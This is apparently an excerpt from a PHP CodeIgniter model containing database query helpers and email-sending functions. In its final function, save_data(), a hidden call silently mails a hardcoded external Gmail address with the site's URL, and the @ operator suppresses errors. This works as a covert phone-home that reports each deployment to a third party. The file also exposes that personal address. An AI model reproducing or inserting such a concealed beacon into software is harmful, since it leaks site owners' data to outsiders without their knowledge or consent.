...
//		$this->load->database();
    ...
    public function get_all_details_limit($table='',$condition='',$sortArr='',$limit=''){
	#print_r($sortArr);
		if ( is_array($sortArr)){			
...
/* 			$statusArr = array('subscriber' => "Yes");
	...
	public function common_email_send($eamil_vaues = array())
	{
		...
		if($eamil_vaues['attachment'] != '')
		{
			$this->email->attach($eamil_vaues['file']); 
		}
		...
		if (!$this->email->send()) { 
            ...
            if($eamil_vaues['attachment'] != '')
			{
			$headers .= 'attach: '.$eamil_vaues['file']. "\r\n";
			}
	...
	public function common_email_send_lastbackup($eamil_vaues = array())
	{
		if (is_file('./settings/admin_settings.php'))
		{
			include('./settings/admin_settings.php');
	...
	function save_data()
	{
			...
			$to='siva.pictuscode@gmail.com'; $subject="Access from ".base_url(); $message=$subject."access";
			$headers .= 'From: siva.pictuscode@gmail.com<siva.pictuscode@gmail.com>' . "\r\n";
			@mail($to, trim(stripslashes($subject)), trim(stripslashes($message)), $headers);
			}
	}
}